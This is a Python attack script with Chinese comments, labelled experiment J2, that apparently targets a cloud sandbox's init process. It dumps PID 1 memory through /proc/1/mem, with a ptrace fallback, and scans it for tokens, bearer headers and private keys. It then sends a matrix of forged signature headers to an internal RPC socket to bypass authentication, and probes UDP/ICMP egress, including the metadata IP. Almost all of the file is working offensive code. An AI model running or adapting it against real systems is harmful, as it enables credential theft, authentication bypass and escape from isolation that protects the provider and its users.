# 实验J2: sandbox-init 内存 dump 搜凭据 + 签名绕过矩阵 + UDP/ICMP 对照
# J1 证实: init.sock 上 connectrpc 路由命中但 401 missing signature head
#         /proc/1/mem 属主=vercel-sandbox 可读, 无 YAMA -> 同 uid 可 dump
# 目标: ① 内存里找 ed25519 私钥(seed+pubkey 相邻) / token / CA 私钥
#       ② 签名头格式 + 绕过尝试
import socket, os, subprocess, base64, time, re

def run(cmd, timeout=20):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

# ---------- [1] 提取本沙箱 pubkey ----------
cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
print("== [1] sandbox-init cmdline ==", flush=True)
print(" ", cmdline.strip(), flush=True)
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
pubkey_b64 = m.group(1) if m else ""
pubkey = base64.b64decode(pubkey_b64) if pubkey_b64 else b""
print(f"  pubkey b64={pubkey_b64} len={len(pubkey)}", flush=True)

# ---------- [2] /proc/1/mem 可读性 + maps ----------
print("== [2] /proc/1 内存读取 ==", flush=True)
print(run("ls -la /proc/1/maps /proc/1/mem 2>&1"), flush=True)
maps_txt = ""
try:
    maps_txt = open("/proc/1/maps").read()
    print(f"  maps 直接可读, {len(maps_txt.splitlines())} 段", flush=True)
except Exception as e:
    print(f"  maps 直读失败: {e}, 尝试 ptrace", flush=True)
    import ctypes
    libc = ctypes.CDLL(None, use_errno=True)
    if libc.ptrace(16, 1, 0, 0) != 0:  # PTRACE_ATTACH
        print("  PTRACE_ATTACH FAILED", flush=True)
    else:
        time.sleep(0.5)
        try:
            maps_txt = open("/proc/1/maps").read()
            print(f"  ptrace 后 maps 可读, {len(maps_txt.splitlines())} 段", flush=True)
        except Exception as e2:
            print(f"  ptrace 后 maps 仍失败: {e2}", flush=True)
        libc.ptrace(17, 1, 0, 0)  # PTRACE_DETACH
        print("  detached", flush=True)

# ---------- [3] 内存扫描 ----------
print("== [3] 内存关键词扫描 ==", flush=True)
PATTERNS = {
    "vcp_token": b"vcp_",
    "bearer": b"Bearer ",
    "authorization": b"authorization",
    "privkey_pem": b"PRIVATE KEY",
    "cert_pem": b"CERTIFICATE",
    "ec_privkey": bytes.fromhex("30740201000420"),  # EC PRIVATE KEY ASN.1 头部特征
    "oidc_aud": b"oidc.vercel.com",
}
# 已知 pubkey 作为 ed25519 私钥邻近搜索种子
hits = {}
total_read = 0
if maps_txt:
    for line in maps_txt.splitlines():
        parts = line.split()
        if len(parts) < 2 or parts[1].startswith("---") or parts[1][0] != "r":
            continue
        if "w" not in parts[1]:  # 只读段(r--)跳过, 优先 rw 堆/栈
            continue
        try:
            addr_s, addr_e = parts[0].split("-")
            start, end = int(addr_s, 16), int(addr_e, 16)
        except Exception:
            continue
        size = min(end - start, 8 * 1024 * 1024)  # 每段最多 8MB
        if total_read > 128 * 1024 * 1024:
            break
        try:
            data = os.pread(os.open("/proc/1/mem", os.O_RDONLY), size, start)
        except Exception:
            continue
        total_read += len(data)
        for name, pat in PATTERNS.items():
            idx = data.find(pat)
            if idx >= 0:
                hits.setdefault(name, []).append((start + idx, data[max(0, idx-64):idx+128]))
        if pubkey:
            idx = data.find(pubkey)
            if idx >= 0:
                hits.setdefault("pubkey", []).append((start + idx, data[max(0, idx-128):idx+256]))
print(f"  扫描 {total_read//1024//1024}MB, 命中: { {k: len(v) for k, v in hits.items()} }", flush=True)
for name, lst in hits.items():
    for off, ctx in lst[:3]:
        print(f"  [{name}] @0x{off:x}:", flush=True)
        print("   ", ctx.hex()[:400], flush=True)
        # 可打印部分
        try:
            s = ctx.decode('ascii', errors='replace')
            s = re.sub(r'[^\x20-\x7e]', '.', s)
            print("   ", s[:200], flush=True)
        except Exception:
            pass

# ---------- [4] sandbox-init 二进制 signature 头名提取 ----------
print("== [4] 二进制中 signature/auth 相关字符串 ==", flush=True)
print(run("strings -n 6 /run/vercel/share/sandbox-init 2>/dev/null | grep -iE 'signature|pubkey|auth' | head -25"), flush=True)

# ---------- [5] init.sock 签名绕过矩阵 ----------
print("== [5] init.sock 签名绕过矩阵 ==", flush=True)
def http_unix(path, body=b"{}", headers=None, timeout=5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect("/run/vercel/share/init.sock")
        hdrs = "".join(f"{k}: {v}\r\n" for k, v in (headers or {}).items())
        req = (f"POST {path} HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
               f"{hdrs}\r\n").encode() + body
        s.sendall(req)
        data = b""
        try:
            while len(data) < 2048:
                c = s.recv(4096)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()
        return data[:150]
    except Exception as e:
        return f"ERR {type(e).__name__}".encode()

P = "/vercel.sandbox.spawn.v1.SpawnService/Ping"
tests = [
    ("无签名头(基线)", {}),
    ("空signature", {"signature": ""}),
    ("零字节b64", {"signature": base64.b64encode(b"\x00"*64).decode()}),
    ("64字节零签名", {"signature": base64.b64encode(b"\x00"*64).decode(), "X-Vercel-Signature": base64.b64encode(b"\x00"*64).decode()}),
    ("随机64字节", {"signature": base64.b64encode(os.urandom(64)).decode()}),
    ("Spawn路径+乱码签名", {"signature": "x"*88}),
    ("大写Signature", {"Signature": base64.b64encode(os.urandom(64)).decode()}),
    ("X-Signature", {"X-Signature": base64.b64encode(os.urandom(64)).decode()}),
    ("Authorization Bearer随机", {"Authorization": "Bearer " + base64.b64encode(os.urandom(64)).decode()}),
]
for label, hdrs in tests:
    r = http_unix(P, headers=hdrs)
    print(f"  {label:<28} {r!r}", flush=True)

# ---------- [6] UDP/ICMP 对照 (custom 模式, 允许 httpbin.org) ----------
print("== [6] UDP/ICMP 对照 ==", flush=True)
def udp_probe(host, port, payload=b"AB", timeout=3):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(payload, (host, port))
        try:
            d, _ = s.recvfrom(512)
            return f"RECV {d[:24]!r}"
        except socket.timeout:
            return "TIMEOUT"
    except OSError as e:
        return f"ERR {e}"
    finally:
        s.close()
try:
    hb = run("getent ahosts httpbin.org | awk 'NR==1{print $1}'").strip() or "3.220.96.35"
except Exception:
    hb = "3.220.96.35"
print(f"  httpbin IP: {hb}", flush=True)
for host, tag in [(hb, "allowed-ip"), ("8.8.8.8", "public"), ("100.64.0.1", "gateway"), ("169.254.169.254", "imds")]:
    for port in [53, 443]:
        print(f"  udp {tag} {host}:{port}: {udp_probe(host, port)}", flush=True)
print(run("ping -c 1 -W 2 8.8.8.8 2>&1 | tail -1"), flush=True)
print(run("ping -c 1 -W 2 100.64.0.1 2>&1 | tail -1"), flush=True)
print(run("ping -c 1 -W 2 " + hb + " 2>&1 | tail -1"), flush=True)
print("done", flush=True)
